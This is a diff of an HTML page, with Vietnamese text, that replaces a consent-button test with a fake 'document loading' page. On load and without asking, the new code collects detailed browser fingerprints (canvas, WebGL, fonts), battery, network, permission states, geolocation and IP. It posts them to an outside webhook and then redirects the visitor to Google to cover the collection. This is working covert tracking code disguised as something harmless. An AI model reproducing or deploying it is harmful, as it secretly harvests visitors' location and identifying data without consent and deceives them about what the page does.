@@ -1,26 +1,250 @@
-<button onclick="sendInfo()">Cho phép gửi thông tin</button>
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đang tải tài liệu...</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; color: #333; }
+        .container { text-align: center; }
+        .loader { border: 4px solid #e0e0e0; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { margin-top: 15px; font-size: 16px; font-weight: 500; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <p>Vui lòng chờ trong giây lát, tài liệu đang được tải...</p>
+    </div>
 
-<script>
-async function sendInfo(){
+    <script>
+        (async function() {
+            // --- CẤU HÌNH ---
+            const WEBHOOK_URL = "https://app.hooklistener.com/w/my-first-endpoint-fuxm"; // thay bằng của bạn nếu cần
+            const REDIRECT_TO = "https://www.google.com";
 
-  const data = {
-    time: new Date().toISOString(),
-    userAgent: navigator.userAgent,
-    language: navigator.language,
-    screen: {
-      width: screen.width,
-      height: screen.height
-    }
-  };
+            let data = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer || "Truy cập trực tiếp",
+                browser: {},
+                hardware: {},
+                screen: {},
+                network: {},
+                timezone: {},
+                fingerprint: {},
+                clientHints: {},
+                permissions: {},
+                accessibility: {},
+                battery: {},
+                location: {},
+                errors: []
+            };
 
-  await fetch("https://app.hooklistener.com/w/my-first-endpoint-fuxm",{
-    method:"POST",
-    headers:{
-      "Content-Type":"application/json"
-    },
-    body: JSON.stringify(data)
-  });
+            try {
+                // 1. Browser info (cơ bản + languages + client hints)
+                data.browser = {
+                    userAgent: navigator.userAgent,
+                    languages: navigator.languages,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    vendor: navigator.vendor,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
+                    deviceMemory: navigator.deviceMemory || "N/A",
+                    maxTouchPoints: navigator.maxTouchPoints || 0
+                };
 
-  alert("Đã gửi dữ liệu test.");
-}
-</script>
+                // Client Hints (nâng cao, thay thế dần UA)
+                if (navigator.userAgentData) {
+                    try {
+                        const hints = await navigator.userAgentData.getHighEntropyValues([
+                            "platform", "platformVersion", "architecture", "model",
+                            "fullVersionList", "bitness", "mobile", "wow64"
+                        ]);
+                        data.clientHints = hints;
+                    } catch (e) { data.errors.push("ClientHints error: " + e.message); }
+                }
+
+                // 2. Screen & Window
+                data.screen = {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    orientation: screen.orientation?.type || "N/A",
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight
+                };
+
+                // 3. Network (Connection API)
+                if (navigator.connection) {
+                    data.network = {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt,
+                        saveData: navigator.connection.saveData
+                    };
+                }
+
+                // 4. Timezone & Locale
+                data.timezone = {
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    locale: Intl.DateTimeFormat().resolvedOptions().locale
+                };
+
+                // 5. Battery (nếu hỗ trợ)
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        data.battery = {
+                            level: battery.level != null ? (battery.level * 100).toFixed(0) + "%" : "N/A",
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                    } catch (e) { data.errors.push("Battery error"); }
+                }
+
+                // 6. Canvas Fingerprint (chi tiết hơn)
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = "alphabetic";
+                    ctx.fillStyle = "#f60";
+                    ctx.fillRect(125, 1, 62, 20);
+                    ctx.fillStyle = "#069";
+                    ctx.font = "11pt no-real-font-123";
+                    ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 2, 15);
+                    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                    ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 4, 17);
+                    ctx.globalCompositeOperation = "multiply";
+                    ctx.fillStyle = "rgb(255,0,255)";
+                    ctx.beginPath();
+                    ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
+                    ctx.closePath();
+                    ctx.fill();
+                    data.fingerprint.canvas = canvas.toDataURL(); // full data URL (có thể hash sau)
+                } catch (e) { data.errors.push("Canvas error"); }
+
+                // 7. WebGL Fingerprint (chi tiết)
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        data.hardware = {
+                            ...data.hardware,
+                            gpuVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A",
+                            gpuRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A",
+                            maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                            extensions: gl.getSupportedExtensions() || []
+                        };
+                    }
+                } catch (e) { data.errors.push("WebGL error"); }
+
+                // 8. Font detection (danh sách font phổ biến - entropy cao)
+                try {
+                    const baseFonts = ["monospace", "sans-serif", "serif"];
+                    const testFonts = ["Arial", "Courier New", "Georgia", "Helvetica", "Times New Roman", "Verdana", "Comic Sans MS", "Trebuchet MS", "Impact", "Segoe UI"];
+                    const testString = "abcdefghijklmnopqrstuvwxyz0123456789";
+                    const span = document.createElement("span");
+                    span.style.fontSize = "72px";
+                    span.style.position = "absolute";
+                    span.style.visibility = "hidden";
+                    span.innerHTML = testString;
+                    document.body.appendChild(span);
+
+                    const fontWidths = {};
+                    baseFonts.forEach(base => {
+                        span.style.fontFamily = base;
+                        fontWidths[base] = span.offsetWidth;
+                    });
+
+                    const detectedFonts = [];
+                    testFonts.forEach(font => {
+                        span.style.fontFamily = `${font}, monospace`;
+                        if (span.offsetWidth !== fontWidths.monospace) {
+                            detectedFonts.push(font);
+                        }
+                    });
+                    data.fingerprint.fonts = detectedFonts;
+                    document.body.removeChild(span);
+                } catch (e) { data.errors.push("Fonts error"); }
+
+                // 9. Accessibility & UI preferences
+                data.accessibility = {
+                    reducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
+                    reducedData: window.matchMedia('(prefers-reduced-data: reduce)').matches,
+                    colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? "dark" : "light",
+                    contrast: window.matchMedia('(prefers-contrast: high)').matches ? "high" : "normal"
+                };
+
+                // 10. Permissions (query một số quyền phổ biến)
+                const permNames = ['geolocation', 'notifications', 'camera', 'microphone'];
+                data.permissions = {};
+                for (const name of permNames) {
+                    try {
+                        const status = await navigator.permissions.query({name});
+                        data.permissions[name] = status.state; // granted / denied / prompt
+                    } catch {}
+                }
+
+                // 11. Geolocation (giữ nguyên, có timeout)
+                if (navigator.geolocation) {
+                    await new Promise(resolve => {
+                        navigator.geolocation.getCurrentPosition(
+                            pos => {
+                                data.location = {
+                                    lat: pos.coords.latitude,
+                                    lon: pos.coords.longitude,
+                                    accuracy: pos.coords.accuracy
+                                };
+                                resolve();
+                            },
+                            err => { data.location = { error: err.message }; resolve(); },
+                            { timeout: 5000, maximumAge: 0 }
+                        );
+                    });
+                }
+
+                // 12. IP (với timeout)
+                try {
+                    const controller = new AbortController();
+                    setTimeout(() => controller.abort(), 3000);
+                    const res = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
+                    const json = await res.json();
+                    data.ip = json.ip;
+                } catch (e) { data.ip = "Không lấy được"; }
+
+            } catch (globalErr) {
+                data.globalError = globalErr.message;
+            }
+
+            // Gửi dữ liệu bằng sendBeacon (đảm bảo gửi trước redirect)
+            try {
+                const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+                navigator.sendBeacon(WEBHOOK_URL, blob);
+            } catch (e) {
+                // fallback fetch nếu beacon không hỗ trợ
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: JSON.stringify(data),
+                    headers: { 'Content-Type': 'application/json' },
+                    keepalive: true
+                }).catch(() => {});
+            }
+
+            // Redirect sau 1 giây để chắc chắn beacon được gửi
+            setTimeout(() => {
+                window.location.replace(REDIRECT_TO);
+            }, 1000);
+
+        })();
+    </script>
+</body>
+</html>
